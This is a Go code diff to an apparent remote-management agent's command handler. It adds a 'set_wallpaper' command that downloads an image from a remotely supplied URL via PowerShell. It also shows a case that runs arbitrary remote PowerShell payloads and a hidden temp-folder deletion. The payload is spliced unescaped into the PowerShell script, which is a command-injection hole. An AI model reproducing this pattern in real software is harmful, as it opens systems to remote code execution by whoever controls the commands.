@@ -595,6 +595,7 @@ func handleRemoteCommand(command string, payload string) {
 	if command == "" {
 		return
 	}
+	
 	log.Printf("⚠️ COMANDO RECEBIDO: %s", command)
 
 	switch command {
@@ -610,14 +611,54 @@ func handleRemoteCommand(command string, payload string) {
 		if runtime.GOOS == "windows" {
 			runCommandHidden("cmd", "/C", "del /q /f /s %TEMP%\\*")
 		}
+
+	case "set_wallpaper":
+		if runtime.GOOS == "windows" {
+			log.Printf("🖼️ Baixando e aplicando papel de parede: %s", payload)
+
+			psScript := fmt.Sprintf(`
+				$url = "%s"
+				$path = "$env:TEMP\wallpaper_agente.jpg"
+				
+				# Tenta deletar o anterior se existir
+				if (Test-Path $path) { Remove-Item $path -Force }
+
+				# Download
+				try {
+					[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+					Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing
+				} catch {
+					Write-Output "Erro no download: $_"
+					exit
+				}
+				
+				# Código C# para forçar a atualização via API do Windows
+				$code = @'
+				using System;
+				using System.Runtime.InteropServices;
+				public class Wallpaper {
+					[DllImport("user32.dll", CharSet = CharSet.Auto)]
+					public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+				}
+'@
+				Add-Type -TypeDefinition $code
+				
+				# SPI_SETDESKWALLPAPER = 0x0014
+				# SPIF_UPDATEINIFILE = 0x01
+				# SPIF_SENDWININICHANGE = 0x02
+				[Wallpaper]::SystemParametersInfo(0x0014, 0, $path, 0x03)
+			`, payload)
+
+			go runPowerShellScript(psScript)
+		}
+
 	case "custom_script":
 		if runtime.GOOS == "windows" {
 			runPowerShellScript(payload)
-			return
 		}
+
 	default:
-		log.Printf("Comando desconhecido: %s", command)
-		return
+		log.Printf("Comando desconhecido ou não suportado: %s", command)
 	}
 }
 
